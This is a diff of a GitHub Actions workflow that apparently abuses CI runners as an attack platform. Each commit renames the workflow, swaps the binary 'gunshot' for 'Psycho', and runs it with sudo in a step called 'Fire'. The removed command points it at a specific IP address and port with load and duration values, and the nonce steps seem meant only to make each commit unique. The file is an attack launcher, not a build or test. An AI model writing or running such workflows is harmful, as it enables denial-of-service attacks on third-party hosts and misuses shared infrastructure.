@@ -1,4 +1,4 @@
-name: psycho-1761bb1e
+name: psycho-6003c276
 on:
   push:
     branches: [ main, master ]
@@ -14,11 +14,11 @@ jobs:
     - name: Checkout
       uses: actions/checkout@v4
     - name: Verify binary
-      run: ls -la && file gunshot || true
+      run: ls -la && file Psycho || true
     - name: Make executable
-      run: chmod +x gunshot
+      run: chmod +x Psycho
     - name: Fire
-      run: sudo ./gunshot 91.108.9.121 32003 400 200
+      run: sudo ./Psycho 0.0.0.0 1 1 200
       continue-on-error: true
-    - name: Nonce 1761bb1e
-      run: echo "nonce=1761bb1e"
+    - name: Nonce 6003c276
+      run: echo "nonce=6003c276"
